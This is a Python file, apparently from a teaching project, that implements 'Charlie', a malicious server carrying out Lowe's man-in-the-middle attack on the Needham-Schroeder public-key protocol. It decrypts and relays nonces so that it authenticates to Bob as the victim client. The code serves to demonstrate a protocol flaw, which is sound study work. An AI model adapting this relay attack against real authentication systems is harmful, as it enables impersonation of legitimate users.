"""
This file represents Charlie, a malicious host.
"""
from socket import socket, AF_INET, SOCK_STREAM
import subprocess, sys, os
sys.path.insert(1, os.path.join(sys.path[0], '..'))
from helpers import *
import time


NAME = "charlie"


def attack(conn):
    """(socket) -> (str) or NoneType
    Performs a man-in-the-middle attack between the client and Bob.
    Returns the client name if attack was successful, otherwise
    returns None.

    :conn: connection to the client (victim)
    """
    # get RSA key of Charlie for decrypting
    rsa_key = rsa.import_key("RsaKey.asc")

    # A -- {N_A, A}(KP_M) --> M
    req_client = rsa.decrypt(rsa_key, conn.recv(1024))
    client_nonce, client_name = req_client.split(',')
    print("Charlie: recieved nonce {} from client {}".format(client_nonce, client_name))

    # get public key of Bob for encrypting
    subprocess.Popen([sys.executable, "../pks/pks.py", 
        "--host=" + str(PKS_HOST),
        "--port=" + str(PKS_CHARLIE_PORT),
        "--extract"])
    time.sleep(1)
    pks_addr = (PKS_HOST, PKS_CHARLIE_PORT)
    bob_pkey = ns.get_public_key(pks_addr, "bob", NAME, rsa_key)
    bob_pkey = rsa.import_key(bob_pkey)

    # reencrypt request for Bob
    req_bob = "{},{}".format(client_nonce, client_name)
    req_bob = rsa.encrypt(bob_pkey, req_bob)

    # open connection with Bob's server
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect((BOB_HOST, BOB_PORT))
        print("Charlie: connected with bob")

        # C -- {N_A, A}(KP_B) --> B
        sock.sendall(req_bob)
        print("Charlie: sent nonce {} to bob, pretending to be {}".format(client_nonce, client_name))

        # M <-- {N_A, N_B}(KP_A) -- B
        resp_bob = sock.recv(1024)
        print("Charlie: recieved encrypted nonces from bob")

        # A <-- {N_A, N_B}(KP_A) -- C
        conn.sendall(resp_bob)
        print("Charlie: redirect encrypted nonces to {}".format(client_name))

        # A -- {N_B}(KP_C) --> C
        req_client = conn.recv(1024)
        if req_client.isdigit() and int(req_client) == RESP_DENIED:
            sock.sendall(req_client)
            return print("Charlie: I've been spotted! Shutting down...")
        bob_nonce = rsa.decrypt(rsa_key, req_client)
        print("Charlie: recieved bob's nonce {} from {}".format(bob_nonce, client_name))

        # M -- {K, N_B}(KP_B) --> B
        req_bob = rsa.encrypt(bob_pkey, bob_nonce)
        sock.sendall(req_bob)
        print("Charlie: redirect nonce {} to bob".format(bob_nonce))

        # check if MIMA was successful
        if int(sock.recv(1024)) == RESP_VERIFIED:
            print("Charlie: I got in!")

	    # confirm verified connection to the victim
            response = bytes(str(RESP_VERIFIED), "utf-8")
            conn.sendall(response)
        else:
            print("Charlie: Uhh oh...")

    print("Charlie: attack completed")


def mitm():
    """() -> NoneType

    Performs a man-in-the-middle attack between the client and Bob,
    then services the client after the attack.

    REQ: bob.py or bob-fix.py is running
    """
    # begin to 'serve' client
    with socket(AF_INET, SOCK_STREAM) as sock_main:
        sock_main.bind((CHARLIE_HOST, CHARLIE_PORT))
        sock_main.listen()
        conn, addr = sock_main.accept()
        with conn:
            print('Charlie: connection from client with address', addr)
            while True:
                # begin the attack
                attack(conn)
                # done, stop server
                return print("Charlie: shutting down server...")


if __name__ == "__main__":
    print("Charlie: malicious server")
    print("Charlie: beginning to 'serve' clients...")
    mitm()
